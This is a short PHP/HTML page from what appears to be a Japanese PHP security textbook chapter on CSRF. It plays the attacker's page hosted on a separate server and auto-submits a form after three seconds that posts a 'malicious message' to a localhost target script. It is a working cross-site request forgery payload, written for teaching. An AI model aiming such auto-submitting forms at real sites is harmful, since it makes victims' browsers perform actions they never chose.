<?php

/* 本プログラムは悪意のあるユーザが用意した別のサーバー上にあると想定してください。 */

declare(strict_types=1);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>投稿画面(悪い例) - honkaku</title>
</head>
<body onload="setTimeout(function(){document.autoform.submit();}, 3000);">
    <form name="autoform" action="http://localhost/honkaku/chapter12/csrf/weak-thankyou.php" method="POST">
        <textarea name="message" style="width:300px;" rows="10">これは悪意のある書き込みです。これは悪意のある書き込みです。</textarea>
        <button type="submit" name="operation" value="send">送信</button>
    </form>
</body>
</html>